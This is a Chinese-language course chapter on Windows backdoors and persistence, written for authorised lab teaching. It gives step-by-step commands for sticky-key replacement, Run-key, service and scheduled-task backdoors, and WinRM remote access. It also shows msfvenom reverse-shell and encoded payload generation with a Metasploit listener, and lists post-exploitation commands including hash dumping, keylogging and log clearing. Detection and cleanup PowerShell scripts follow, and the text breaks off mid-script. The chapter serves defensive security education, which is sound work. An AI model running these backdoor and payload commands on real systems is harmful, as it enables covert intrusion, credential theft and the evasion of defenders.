# 07.项目七 Windows应用安全

---

# 📌 课前回顾

在学习本项目之前，先来回顾前面学过的安全配置知识，建立知识桥梁。

**回顾问题：**

1. 在项目四中，我们学习了 IIS 网站安全加固的四大纵深防御层分别是什么？（日志审计、请求筛选、安全响应头、权限/HTTPS）
2. 如果一个 Web 服务器的上传目录同时赋予了"写入"和"脚本执行"权限，攻击者可以做什么？
3. Windows Server 中以 SYSTEM 权限运行的服务有哪些安全隐患？
4. 在项目六域管理中，攻击者获取 NTDS.dit 数据库后可以做什么？
5. 什么是"最小权限原则"？在 IIS 应用程序池中如何体现？

🔗

**知识衔接**：前面的项目从"搭建服务 → 部署网站 → 安全加固 → 远程管理 → 域管理"形成了一条完整的服务器运维链。本项目将从**攻击者视角**出发，学习攻击者如何在Windows应用层面植入后门、上传WebShell、实现持久化控制——只有理解了"怎么攻"，才能真正做到"怎么防"。这也是安全专业人才的核心能力：**知攻善防**。

⚠️

**声明**：本项目内容仅用于授权环境下的安全教学与攻防演练。严禁对未经授权的系统实施任何渗透测试行为，违者依法承担法律责任。

---

# 🎯 学习目标

| 层次 | 内容 |
| --- | --- |
| 知识 | 理解后门（Backdoor）的定义、分类与工作原理；掌握Windows系统中常见的持久化技术（注册表、计划任务、服务、WMI、粘滞键）；理解WebShell的分类、工作原理与文件上传漏洞利用链；了解木马的分类与反弹Shell的通信原理 |
| 技能 | 能够使用Meterpreter执行常见的后渗透操作；能够创建和检测各类Windows持久化后门；能够上传WebShell并利用其执行远程命令；能够使用PowerShell脚本检测和清除各类后门；能够对IIS进行WebShell防护加固 |
| 素养 | 树立"知攻善防"的安全意识，理解攻防对抗的本质；强化法律意识，明确未授权渗透测试的法律后果；培养应急响应思维——发现后门后如何系统化清除 |

---

# ⚠️ 重难点梳理

| 类型 | 内容 | 说明 |
| --- | --- | --- |
| 重点 | Windows常见持久化技术的原理与实现 | 注册表Run键、计划任务、系统服务、WMI事件订阅、粘滞键替换——理解每种技术的触发机制和运行原理是检测和防御的基础 |
| 重点 | WebShell的分类与一句话木马工作原理 | 理解小马/大马/一句话木马的区别，以及客户端（菜刀/冰蝎/哥斯拉）如何与WebShell通信 |
| 重点 | 后门检测与清除的系统化流程 | 掌握从注册表、计划任务、服务、WMI、网络连接、进程等多维度全面排查后门的方法 |
| 难点 | WMI事件订阅后门的原理与检测 | WMI事件订阅涉及过滤器、消费者、绑定三个组件，理解三者关系和如何彻底清除是难点 |
| 难点 | 免杀技术与现代WebShell对抗 | 理解为什么传统杀软难以检测内存马、加密WebShell等现代攻击技术，以及对应的防御思路（EDR、RASP） |
| 难点 | 文件上传漏洞绕过技术 | 前端验证绕过、Content-Type修改、扩展名黑名单绕过、图片马等技术需要理解后端验证逻辑 |

---

# 任务一 Windows应用后门

## 🧠 理论知识

### 后门（Backdoor）的概念

#### 什么是后门？

**后门**是攻击者预先在系统中植入的秘密访问通道，使其能够绕过正常的安全认证机制，在失去初始访问权限后仍能重新进入系统。

打个比方：想象一栋大楼有正规的门禁系统（正常的登录认证）。攻击者第一次进入大楼后，在某个隐蔽角落安装了一扇只有自己知道的暗门。即使正规门禁密码被更换，攻击者仍然可以通过暗门进出——这就是后门。

```
正常的登录流程：
用户 ──输入账号密码──→ 认证系统 ──验证通过──→ 系统资源
                        ✅ 合法

后门的隐蔽通道：
攻击者 ──暗门通道──→ 系统资源
         🔓 绕过认证
```

#### 后门的分类

Windows系统中常见的后门类型：

| 类型 | 说明 | 触发机制 | 示例 |
| --- | --- | --- | --- |
| **账户后门** | 创建隐藏的高权限用户账户 | 使用$符号隐藏账户名 | `net user admin$ P@ss /add` |
| **服务后门** | 以系统服务形式运行恶意程序 | 系统启动时自动运行 | `sc create`创建恶意服务 |
| **注册表后门** | 修改注册表实现开机自启动 | 用户登录时触发 | Run键、RunOnce键 |
| **计划任务后门** | 定时或特定条件下执行恶意任务 | 定时/登录/启动时触发 | `schtasks`创建任务 |
| **WMI事件订阅** | 利用WMI事件触发恶意代码 | 系统事件触发，极难检测 | 永久事件订阅 |
| **DLL劫持** | 替换合法DLL为恶意DLL | 程序启动时加载 | 搜索顺序劫持 |
| **粘滞键后门** | 替换辅助功能程序 | 登录界面按键触发 | sethc.exe替换 |
| **端口复用后门** | 复用合法服务端口建立隐蔽通道 | 网络连接到达时触发 | WinRM端口复用 |

> 💡 **持久化（Persistence）** 是后门的核心目的。攻击者获取初始访问后，必须建立持久化机制，确保重启、密码更改、补丁更新后仍能重新进入系统。MITRE ATT&CK框架将持久化列为攻击链的关键阶段（TA0003）。

#### 后门攻击链全景图

```
攻击者获取初始访问权限（如利用漏洞、钓鱼邮件、弱密码）
    │
    ├── 1. 权限提升（Privilege Escalation）
    │       本地漏洞利用 → 获取SYSTEM权限
    │
    ├── 2. 植入后门（Persistence） ←── 本任务重点
    │       注册表/计划任务/服务/WMI/DLL劫持
    │
    ├── 3. 横向移动（Lateral Movement）
    │       利用后门跳板访问内网其他机器
    │
    └── 4. 数据窃取/破坏（Impact）
            最终目的
```

---

### 后门技术详解

#### 1. Windows系统服务后门

**原理**：Windows服务在系统启动时自动运行，且以**SYSTEM权限**运行。攻击者可以创建一个伪装成合法服务的恶意服务，实现开机自启动的持久化后门。

**服务的关键属性**：

| 属性 | 说明 | 用于伪装的技巧 |
| --- | --- | --- |
| 服务名称 | 系统内部标识 | 使用类似系统服务的名称，如`WindowsUpdateHelper` |
| 显示名称 | 服务管理器中显示的名称 | 使用欺骗性的显示名称 |
| 启动类型 | 自动/手动/禁用 | 设为`auto`（自动）确保开机启动 |
| 二进制路径 | 服务执行的程序路径 | 指向恶意程序路径 |
| 描述信息 | 服务描述文本 | 填写看似合法的描述信息 |
| 运行身份 | 服务运行的账户 | 默认为SYSTEM（最高权限） |

```
服务后门的运作机制：
    系统启动
       ↓
    服务控制管理器（SCM）读取注册表
       ↓
    根据Services键下的配置启动服务
       ↓
    以SYSTEM权限运行恶意程序
       ↓
    攻击者获得持久化访问
```

**创建服务后门的命令**：

```powershell
# 创建伪装服务
sc create "WindowsUpdateHelper" binpath="C:\Windows\Temp\malware.exe" start=auto
sc description "WindowsUpdateHelper" "Provides Windows Update support services"
sc start "WindowsUpdateHelper"

# 查看服务配置
sc qc "WindowsUpdateHelper"
sc query "WindowsUpdateHelper"
```

> 🔍 **检测线索**：通过 `sc query type=service state=all` 或 `Get-Service` 查看所有服务，重点关注启动类型为"自动"但名称/描述可疑、二进制路径指向Temp等非常规目录的服务。

---

#### 2. 注册表持久化后门

**原理**：Windows注册表中有多个"自动启动"位置，在这些位置添加恶意程序的路径，即可在用户登录或系统启动时自动执行恶意代码。

**常用注册表持久化路径**：

| 注册表路径 | 触发时机 | 适用范围 | 检测难度 |
| --- | --- | --- | --- |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | 用户登录时 | 所有用户 | ⭐⭐（易） |
| `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | 用户登录时 | 当前用户 | ⭐⭐（易） |
| `HKLM\...\CurrentVersion\RunOnce` | 下次启动时运行一次 | 所有用户 | ⭐⭐（易） |
| `HKLM\...\Policies\Explorer\Run` | 用户登录时（策略级） | 所有用户 | ⭐⭐⭐（中） |
| `HKLM\SYSTEM\CurrentControlSet\Services` | 系统启动 | 服务形式 | ⭐⭐⭐（中） |
| `HKLM\...\Image File Execution Options` | 指定进程启动时 | 所有用户 | ⭐⭐⭐⭐（难） |

> 💡 **AppInit_DLLs** 和 **Image File Execution Options (IFEO)** 是更高级的注册表持久化技术。IFEO可以通过设置`Debugger`值来劫持任意进程——当目标程序启动时，实际执行的是攻击者指定的程序。

**注册表Run键的工作原理**：

```
用户输入密码登录Windows
       ↓
Winlogon.exe启动用户Shell（通常是explorer.exe）
       ↓
Explorer.exe读取注册表Run键中的所有值
       ↓
依次执行每个键值对应的程序路径
       ↓
恶意程序被自动启动，以当前用户权限运行
```

---

#### 3. 计划任务后门

**原理**：Windows任务计划程序允许在指定时间、特定事件发生时自动执行程序。攻击者可以创建隐藏的计划任务，实现定时或触发式执行恶意代码。

**计划任务的触发方式**：

| 触发方式 | 说明 | 适用场景 |
| --- | --- | --- |
| 系统启动时（onstart） | 计算机开机后自动执行 | 需要尽早执行的后门 |
| 用户登录时（onlogon） | 用户登录后自动执行 | 以当前用户身份执行 |
| 定时执行（daily/weekly） | 指定时间自动执行 | 定期回连C2服务器 |
| 空闲时（onidle） | 计算机空闲一段时间后执行 | 避免引起用户注意 |
| 事件触发（onevent） | 特定Windows事件发生时执行 | 高级隐蔽触发 |

**创建计划任务后门**：

```powershell
# 开机自启动（SYSTEM权限）
schtasks /create /tn "SystemHealthCheck" /tr "C:\Windows\Temp\malware.exe" /sc onstart /ru SYSTEM /f

# 每天凌晨3点执行（模拟系统维护）
schtasks /create /tn "DiskCleanup" /tr "C:\Windows\Temp\malware.exe" /sc daily /st 03:00 /ru SYSTEM /f

# 用户登录时执行
schtasks /create /tn "UserProfileSync" /tr "C:\Windows\Temp\malware.exe" /sc onlogon /f

# 查看任务详情
schtasks /query /tn "SystemHealthCheck" /fo LIST /v
```

> 🔍 **检测线索**：使用 `schtasks /query /fo TABLE` 或 `Get-ScheduledTask` 列出所有计划任务，重点排查作者非Microsoft、执行路径指向非标准目录、名称模仿系统任务的任务。

---

#### 4. WMI事件订阅后门

**原理**：WMI（Windows Management Instrumentation）是Windows的管理框架，支持事件订阅机制。攻击者可以创建**永久事件订阅**，当特定事件发生时自动执行恶意命令。WMI后门是最高级的持久化技术之一，因为它**不需要在磁盘上存放恶意文件**，完全在WMI数据库中存储。

**WMI事件订阅的三个组件**：

```
WMI事件订阅的运作机制：

┌────────────────────┐     ┌────────────────────┐     ┌──────────────────┐
│   事件过滤器        │     │   事件消费者        │     │   绑定关系        │
│   __EventFilter     │────→│   CommandLineEvent  │────→│  __FilterTo       │
│                     │     │   Consumer          │     │  ConsumerBinding  │
│ 定义"什么事件触发" │     │ 定义"触发后做什么" │     │ 连接过滤器和消费者│
│                     │     │                     │     │                   │
│ 例：每60秒系统性能  │     │ 例：执行恶意程序    │     │ 三者缺一不可      │
│ 数据变化事件        │     │                     │     │                   │
└────────────────────┘     └────────────────────┘     └──────────────────┘

触发流程：
    系统事件发生（如每60秒的性能计数器更新）
       ↓
    WMI检查__EventFilter → 匹配过滤条件
       ↓
    通过__FilterToConsumerBinding找到关联的Consumer
       ↓
    执行CommandLineEventConsumer中指定的命令
       ↓
    恶意代码被执行（无文件落地，极难检测）
```

**WMI后门为什么难以检测？**

| 特征 | 说明 |
| --- | --- |
| 无文件落地 | 恶意代码存储在WMI数据库中，不在文件系统上 |
| 无进程残留 | 只在事件触发时短暂执行，平时无恶意进程 |
| 无注册表Run键 | 不使用常见的启动项，绕过常规检测 |
| 以SYSTEM权限运行 | WMI提供者默认以SYSTEM身份执行 |
| 可跨系统持久化 | 可配置为永久订阅，重启后仍然存在 |

---

#### 5. DLL劫持后门

**原理**：Windows程序在加载DLL时，按照特定的搜索顺序查找DLL文件。攻击者可以将恶意DLL放置在搜索顺序靠前的位置，使程序优先加载恶意DLL而非合法DLL。

**DLL搜索顺序**：

```
Windows DLL搜索顺序（默认）：
    1. 应用程序所在目录          ← 最常被利用
    2. 系统目录（System32）
    3. 16位系统目录
    4. Windows目录
    5. 当前工作目录
    6. PATH环境变量中的目录
```

**攻击场景示例**：

```
某合法程序 C:\Tools\app.exe 启动时需要加载 userenv.dll

攻击者在 C:\Tools\ 盘下放置恶意的 userenv.dll
       ↓
app.exe 启动 → 搜索 userenv.dll
       ↓
优先在应用程序目录找到恶意 userenv.dll → 加载执行
       ↓
恶意DLL在被加载时执行攻击代码，同时转发调用给合法DLL
       ↓
程序正常运行，用户无感知
```

> 🔍 **检测线索**：使用Process Monitor监控程序的DLL加载行为，查找从非标准路径加载的DLL；使用 `signtool` 验证DLL的数字签名是否合法。

---

#### 6. 粘滞键后门（辅助功能后门）

**原理**：Windows登录界面提供辅助功能（如粘滞键sethc.exe、放大镜magUtilify.exe、屏幕键盘osk.exe等），这些程序以**SYSTEM权限**运行且无需登录即可触发。将其中某个程序替换为cmd.exe后，攻击者可在登录界面直接获得SYSTEM权限的命令行。

```
粘滞键后门的运作机制：
    登录界面（未认证状态）
       ↓
    连续按5次Shift键
       ↓
    Windows启动 C:\Windows\System32\sethc.exe
       ↓
    正常：弹出粘滞键设置对话框
    被替换后：弹出 cmd.exe（以SYSTEM权限运行）
       ↓
    攻击者可在命令行中创建后门账户、修改密码等
```

**为什么能以SYSTEM权限运行？** 登录界面的辅助功能由Winlogon.exe（Windows登录进程）启动，Winlogon.exe本身以SYSTEM身份运行，因此它启动的子进程也继承了SYSTEM权限。

> 💡 **现代防御**：Windows 10/11和Windows Server 2016+已启用**Windows File Protection (WFP)** 和 **Secure Boot**，限制对System32目录下关键文件的直接替换。但通过WinPE环境或已有的SYSTEM权限仍可实现类似攻击。

---

## 🛠️ 实践操作

### 实验环境说明

> 本任务的实验操作需要以下环境：
> - **靶机**：Windows Server 2016/2019/2022（虚拟机，实验前创建快照）
> - **攻击机**：Kali Linux（安装Metasploit Framework）
> - **网络**：两台虚拟机处于同一NAT网络，能互相通信
> - **重要提示**：实验前请关闭Windows Defender实时防护，或将其排除实验目录

---

### 实验1：Windows "5次Shift" 粘滞键后门

**原理回顾**：登录界面按5次Shift键启动sethc.exe（以SYSTEM权限运行），将其替换为cmd.exe即可在登录界面获得SYSTEM命令行。

**操作步骤**：

**第一步：以管理员身份替换系统文件**

```powershell
# 需要以管理员身份运行PowerShell

# 查看原sethc.exe的文件信息
Get-Item C:\Windows\System32\sethc.exe | Select-Object Name, Length, LastWriteTime

# 备份原文件
Copy-Item C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.exe.bak

# 获取文件所有权（默认受TrustedInstaller保护）
takeown /f C:\Windows\System32\sethc.exe /a

# 授予管理员完全控制权限
icacls C:\Windows\System32\sethc.exe /grant administrators:F

# 替换为cmd.exe
Copy-Item C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe -Force
```

**第二步：验证后门**

1. 注销当前用户，回到登录界面（或锁定屏幕）
2. 连续快速按5次 **Shift** 键
3. 如果后门成功，将弹出以SYSTEM权限运行的命令提示符窗口
4. 在命令行中验证权限：

```cmd
whoami
:: 预期输出：nt authority\system

:: 创建后门管理员账户（演示用途）
net user backdoor P@ssw0rd123 /add
net localgroup administrators backdoor /add
```

**第三步：恢复原文件**

```powershell
# 恢复原始sethc.exe
Copy-Item C:\Windows\System32\sethc.exe.bak C:\Windows\System32\sethc.exe -Force

# 恢复文件权限
icacls C:\Windows\System32\sethc.exe /reset

# 删除后门账户（如果创建了）
net user backdoor /delete
```

**防御措施**：

| 防御方法 | 说明 |
| --- | --- |
| 启用Secure Boot | 防止在启动阶段篡改系统文件 |
| 启用Windows File Protection | 限制对System32关键文件的写入 |
| 启用BitLocker磁盘加密 | 防止通过WinPE离线替换文件 |
| 监控System32文件哈希变化 | 使用文件完整性监控工具（FIM） |

---

### 实验2：注册表Run键后门

**操作步骤**：

**第一步：创建注册表后门**

```powershell
# 方法一：使用reg命令
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateHelper" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

# 方法二：使用PowerShell cmdlet
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name "SystemHealthMonitor" `
    -Value "C:\Windows\Temp\backdoor.exe" `
    -PropertyType String -Force

# 验证后门已创建
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

**第二步：检测注册表后门**

```powershell
# 检查所有常见的注册表自启动位置
$autorunPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
)

foreach ($path in $autorunPaths) {
    Write-Host "`n=== $path ===" -ForegroundColor Yellow
    if (Test-Path $path) {
        Get-ItemProperty -Path $path | Format-List
    } else {
        Write-Host "路径不存在" -ForegroundColor Gray
    }
}
```

**第三步：清除注册表后门**

```powershell
# 删除恶意启动项
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper"
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemHealthMonitor"

# 验证已清除
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Format-List
```

---

### 实验3：系统服务后门

**操作步骤**：

**第一步：创建服务后门**

```powershell
# 创建伪装的系统服务
sc create "SystemDiagnostic" binpath="C:\Windows\Temp\backdoor.exe" start=auto displayname="System Diagnostic Service"
sc description "SystemDiagnostic" "Monitors system health and performance metrics"
sc start "SystemDiagnostic"

# 查看服务配置详情
sc qc "SystemDiagnostic"
sc query "SystemDiagnostic"
```

**第二步：检测可疑服务**

```powershell
# 列出所有自动启动的服务
Get-Service | Where-Object {$_.StartType -eq "Automatic"} | Format-Table Name, DisplayName, Status, StartType

# 检查非Microsoft服务（重点关注）
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notlike "*System32*" -and
    $_.PathName -notlike "*SysWOW64*" -and
    $_.PathName -notlike "*Program Files*"
} | Select-Object Name, DisplayName, PathName, StartMode | Format-Table -AutoSize

# 检查服务的可执行文件数字签名
Get-WmiObject Win32_Service | ForEach-Object {
    $path = $_.PathName -replace '"',''
    if (Test-Path $path) {
        $sig = Get-AuthenticodeSignature $path
        if ($sig.Status -ne "Valid") {
            [PSCustomObject]@{
                ServiceName = $_.Name
                Path = $path
                SignatureStatus = $sig.Status
            }
        }
    }
}
```

**第三步：清除服务后门**

```powershell
# 停止并删除恶意服务
sc stop "SystemDiagnostic"
sc delete "SystemDiagnostic"

# 删除恶意文件
Remove-Item "C:\Windows\Temp\backdoor.exe" -Force -ErrorAction SilentlyContinue
```

---

### 实验4：计划任务后门

**操作步骤**：

**第一步：创建计划任务后门**

```powershell
# 开机自启动（SYSTEM权限）
schtasks /create /tn "SystemHealthCheck" /tr "C:\Windows\Temp\backdoor.exe" /sc onstart /ru SYSTEM /f

# 每天凌晨3点执行
schtasks /create /tn "DiskCleanupTask" /tr "C:\Windows\Temp\backdoor.exe" /sc daily /st 03:00 /ru SYSTEM /f

# 用户登录时执行
schtasks /create /tn "UserProfileSync" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /f

# 验证计划任务
schtasks /query /tn "SystemHealthCheck" /fo LIST /v
```

**第二步：检测可疑计划任务**

```powershell
# 列出所有非Microsoft的计划任务
Get-ScheduledTask | Where-Object {$_.Author -notlike "Microsoft*" -and $_.Author -ne $null} |
    Select-Object TaskName, TaskPath, State, @{N="Author";E={$_.Author}} |
    Format-Table -AutoSize

# 列出所有以SYSTEM权限运行的计划任务
Get-ScheduledTask | Where-Object {
    $_.Principal.UserId -eq "SYSTEM" -or $_.Principal.UserId -eq "NT AUTHORITY\SYSTEM"
} | Select-Object TaskName, TaskPath, State |
    Format-Table -AutoSize

# 查看任务详情（包括执行的程序路径）
schtasks /query /fo TABLE /v | findstr /I "TaskName Actions"
```

**第三步：清除计划任务后门**

```powershell
# 删除恶意计划任务
schtasks /delete /tn "SystemHealthCheck" /f
schtasks /delete /tn "DiskCleanupTask" /f
schtasks /delete /tn "UserProfileSync" /f

# 验证清除结果
Get-ScheduledTask | Where-Object {$_.TaskName -in @("SystemHealthCheck","DiskCleanupTask","UserProfileSync")} | Select-Object TaskName, State
```

---

### 实验5：WinRM端口复用后门

**原理回顾**：WinRM（Windows Remote Management）是Windows远程管理服务，默认监听5985(HTTP)/5986(HTTPS)端口，支持PowerShell远程会话。攻击者可以利用已建立的WinRM通道进行隐蔽的远程控制。

**操作步骤**：

```powershell
# ===== 在靶机上执行 =====

# 启用WinRM服务
Enable-PSRemoting -Force

# 添加受信任主机（允许攻击机连接）
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.100.10" -Force

# 验证WinRM配置
winrm get winrm/config/service
winrm get winrm/config/client

# ===== 在攻击机上连接 =====

# 交互式远程Shell
Enter-PSSession -ComputerName 192.168.100.20 -Credential (Get-Credential)

# 远程执行命令
Invoke-Command -ComputerName 192.168.100.20 -ScriptBlock {
    whoami
    hostname
    Get-Process | Select-Object -First 5
} -Credential (Get-Credential)

# 上传文件到靶机
$session = New-PSSession -ComputerName 192.168.100.20 -Credential (Get-Credential)
Copy-Item -Path "C:\local\payload.exe" -Destination "C:\Windows\Temp\" -ToSession $session
```

**防御WinRM后门**：

```powershell
# 查看WinRM是否启用
Get-Service WinRM | Select-Object Name, Status, StartType

# 禁用WinRM（如果不需要）
Disable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "" -Force
Stop-Service WinRM
Set-Service WinRM -StartupType Disabled

# 如果需要WinRM，限制为仅允许域内连接
Set-Item WSMan:\localhost\Service\AllowRemoteAccess -Value $true
# 配置防火墙仅允许指定IP
New-NetFirewallRule -DisplayName "WinRM Restrict" -Direction Inbound -Protocol TCP -LocalPort 5985 -RemoteAddress 192.168.100.0/24 -Action Allow
```

---

### 实验6：反弹木马与Meterpreter（msfvenom + Metasploit）

**原理**：反弹Shell（Reverse Shell）是攻击技术中的核心概念。与正向连接不同，反弹Shell由**目标主机主动连接攻击机**，能有效绕过目标主机的入站防火墙规则。

```
正向连接（Forward Shell）：
攻击者 ──连接──→ 目标主机:4444
         容易被防火墙拦截（入站规则）

反弹连接（Reverse Shell）：
攻击者 ──监听──→ :4444
目标主机 ──主动连接──→ 攻击者:4444
         绕过防火墙（出站通常放行）
```

**第一步：生成反弹木马（在Kali攻击机上）**

```bash
# 生成Windows x64反弹Shell EXE木马
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f exe -o /tmp/backdoor.exe

# 生成PowerShell脚本木马（无文件落地）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f psh -o /tmp/backdoor.ps1

# 生成带编码的木马（绕过基础特征检测）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o /tmp/backdoor_encoded.exe

# 生成HTTPS加密通道的木马（流量更隐蔽）
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.10 LPORT=443 -f exe -o /tmp/backdoor_https.exe
```

**第二步：启动监听（在Kali攻击机上）**

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.10
set LPORT 4444
exploit -j
```

**第三步：在靶机上执行木马并获取Meterpreter会话**

```bash
# 将木马上传到靶机（可通过SMB共享、钓鱼邮件、USB等方式）
# 执行木马后，攻击机上将获得Meterpreter会话
```

**第四步：Meterpreter常用后渗透操作**

| 命令 | 功能 | 说明 |
| --- | --- | --- |
| `getuid` | 查看当前用户权限 | 确认是否已获得SYSTEM权限 |
| `getsystem` | 尝试提权到SYSTEM | 利用多种提权技术自动尝试 |
| `sysinfo` | 查看系统信息 | 操作系统版本、架构、域信息 |
| `ps` | 查看进程列表 | 识别安全软件和关键进程 |
| `migrate <pid>` | 迁移到目标进程 | 避免木马进程被杀掉 |
| `hashdump` | 导出密码哈希 | 获取SAM数据库中的NTLM哈希 |
| `screenshot` | 截取屏幕 | 查看用户当前操作 |
| `keyscan_start` | 开始键盘记录 | 记录用户击键 |
| `keyscan_dump` | 导出键盘记录 | 获取用户输入的密码等 |
| `upload` | 上传文件到靶机 | 传输工具或恶意文件 |
| `download` | 从靶机下载文件 | 窃取敏感文件 |
| `portfwd` | 端口转发 | 访问靶机内网的服务 |
| `persistence` | 安装持久化后门 | 自动创建注册表+服务后门 |
| `shell` | 进入系统Shell | 获取cmd.exe命令行 |
| `clearev` | 清除事件日志 | 销毁入侵证据（违法！） |

> 💡 **migrate命令的重要性**：木马进程（如backdoor.exe）非常容易被用户或杀软发现并终止。使用`migrate`将Meterpreter会话迁移到一个合法的、长期运行的进程（如explorer.exe、svchost.exe）中，可以大幅提高隐蔽性和存活率。

---

### 实验7：后门全面检测与清除

> 这是本任务最关键的防御实验。掌握系统化的后门检测流程，是安全运维人员的核心技能。

**第一步：一键检测脚本**

```powershell
# ============================================
# Windows后门全面检测脚本
# 以管理员身份运行PowerShell
# ============================================

Write-Host "`n========== Windows 后门检测报告 ==========" -ForegroundColor Cyan
Write-Host "检测时间: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Gray
Write-Host "计算机名: $env:COMPUTERNAME" -ForegroundColor Gray

# 1. 检查注册表启动项
Write-Host "`n[1/7] 检查注册表自启动项..." -ForegroundColor Yellow
$regPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
)
foreach ($path in $regPaths) {
    if (Test-Path $path) {
        $props = Get-ItemProperty -Path $path
        $props.PSObject.Properties | Where-Object {$_.Name -notlike "PS*"} | ForEach-Object {
            Write-Host "  [$path] $($_.Name) = $($_.Value)" -ForegroundColor White
        }
    }
}

# 2. 检查非标准服务
Write-Host "`n[2/7] 检查可疑系统服务..." -ForegroundColor Yellow
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notlike "*System32*" -and
    $_.PathName -notlike "*SysWOW64*" -and
    $_.PathName -notlike "*Program Files*" -and
    $_.PathName -notlike "*Windows\Microsoft.NET*" -and
    $_.StartMode -eq "Auto"
} | Select-Object Name, DisplayName, PathName, StartMode | Format-Table -AutoSize

# 3. 检查非Microsoft计划任务
Write-Host "`n[3/7] 检查可疑计划任务..." -ForegroundColor Yellow
Get-ScheduledTask | Where-Object {
    $_.Author -notlike "Microsoft*" -and
    $_.Author -notlike "*Adobe*" -and
    $_.Author -ne $null -and
    $_.State -ne "Disabled"
} | Select-Object TaskName, TaskPath, State, @{N="Author";E={$_.Author}} | Format-Table -AutoSize

# 4. 检查WMI事件订阅
Write-Host "`n[4/7] 检查WMI事件订阅..." -ForegroundColor Yellow
$filters = Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -ErrorAction SilentlyContinue
$consumers = Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer -ErrorAction SilentlyContinue
$bindings = Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue
if ($filters) { Write-Host "  发现事件过滤器:" -ForegroundColor Red; $filters | Format-List Name, Query }
if ($consumers) { Write-Host "  发现命令行消费者:" -ForegroundColor Red; $consumers | Format-List Name, CommandLineTemplate }
if ($bindings) { Write-Host "  发现绑定关系:" -ForegroundColor Red; $bindings | Format-List }

# 5. 检查sethc.exe等辅助功能是否被替换
Write-Host "`n[5/7] 检查辅助功能文件完整性..." -ForegroundColor Yellow
$systemFiles = @("sethc.exe", "utilman.exe", "osk.exe", "magnify.exe", "narrator.exe", "displayswitch.exe")
foreach ($file in $systemFiles) {
    $fullPath = "C:\Windows\System32\$file"
    if (Test-Path $fullPath) {
        $hash = (Get-FileHash $fullPath -Algorithm SHA256).Hash
        Write-Host "  $file : $hash" -ForegroundColor White
    }
}
# 注意：需要与已知正常哈希对比才能判断是否被篡改

# 6. 检查可疑网络连接
Write-Host "`n[6/7] 检查可疑网络连接..." -ForegroundColor Yellow
Get-NetTCPConnection -State Established | Where-Object {
    $_.RemoteAddress -notlike "127.0.0.1" -and
    $_.RemoteAddress -notlike "::1" -and
    $_.RemoteAddress -notlike "0.0.0.0"
} | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort,
    @{N="Process";E={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name}} |
    Sort-Object RemoteAddress | Format-Table -AutoSize

# 7. 检查可疑进程
Write-Host "`n[7/7] 检查可疑进程..." -ForegroundColor Yellow
Get-Process | Where-Object {
    $_.Path -and (
        $_.Path -like "*Temp*" -or
        $_.Path -like "*AppData*" -or
        $_.Path -like "*Users\Public*"
    )
} | Select-Object Name, Id, Path, StartTime | Format-Table -AutoSize

Write-Host "`n========== 检测完成 ==========" -ForegroundColor Cyan
```

**第二步：一键清除脚本**（根据检测结果选择性执行）

```powershell
# ============================================
# Windows后门一键清除脚本
# 以管理员身份运行PowerShell
# ============================================

Write-Host "开始清除后门..." -ForegroundColor Red

# 1. 清除注册表后门（根据检测结果修改键名）
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemHealthMonitor" -ErrorAction SilentlyContinue

# 2. 清除计划任务后门
schtasks /delete /tn "SystemHealthCheck" /f 2>$null
schtasks /delete /tn "DiskCleanupTask" /f 2>$null
schtasks /delete /tn "UserProfileSync" /f 2>$null

# 3. 清除服务后门
sc stop "SystemDiagnostic" 2>$null
sc delete "SystemDiagnostic" 2>$null

# 4. 恢复sethc.exe
